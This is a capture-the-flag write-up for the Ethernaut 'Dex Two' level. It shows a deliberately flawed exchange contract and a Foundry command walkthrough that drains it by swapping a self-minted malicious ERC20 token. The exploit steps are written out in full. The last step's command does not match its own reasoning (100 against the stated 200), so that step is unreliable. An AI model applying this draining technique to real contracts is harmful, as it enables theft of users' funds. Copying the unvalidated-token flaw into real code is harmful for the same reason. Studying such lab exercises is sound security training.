## Dex Level Outline

**Difficulty : 4/10**

This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xd2BA82c4777a8d619144d32a2314ee620BC9E09c)

## Solution

The price is calculated based on the ratio of tokenA and tokenB. If we createa a malicious ERC20 token and add liquidity to the contract, we can control the exchange rate and drain all tokens.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
    constructor() ERC20("MaliciousToken", "MALTKN") {
        _mint(msg.sender, 1000000);
    }
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:MaliciousToken --private-key  $PRIVATE_KEY
```

##### 3. Approve the Dex contract to spend our tokens. We need to do this to add liquidity
```console
cast send $DEPLOYED_ADDRESS "approve(address,uint256)" $LEVEL_ADDRESS 200 --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

##### 4. Send 100 of our `MALTKN` to the dex so that the price ratio between `token1` and `MALTKN` is 1:1
```console
cast send $LEVEL_ADDRESS "add_liquidity(address,uint)" $DEPLOYED_ADDRESS 100 --gas 150000 \ 
--private-key $PRIVATE_KEY
```


##### 5. Let's get the addresses for `token1` and `token2`
 
```console
cast call $LEVEL_ADDRESS "token1()"

cast call $LEVEL_ADDRESS "token2()"
```

##### 6. Now that the exchange rate is 1:1, let's send swap 100 of our malicious token to `token1` to drain the dex's supply of `token1`.
 
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $DEPLOYED_ADDRESS $TOKEN1_ADDRESS 100 --gas 250000 \
--private-key $PRIVATE_KEY
```

##### 7. Now the total supply of `MALTKN` in the contract is 200, meaning that the ratio between `MALTKN` and `token2` will be 0.5:1 
 
to drain the supply of `token2` we need to swap 200 `MALTKN` for `token2`
```console
cast send $LEVEL_ADDRESS "swap(address,address,uint)" $DEPLOYED_ADDRESS $TOKEN2_ADDRESS 100 --gas 250000 \
--private-key $PRIVATE_KEY
```

### [:arrow_left: Back To Main Menu](../README.md)
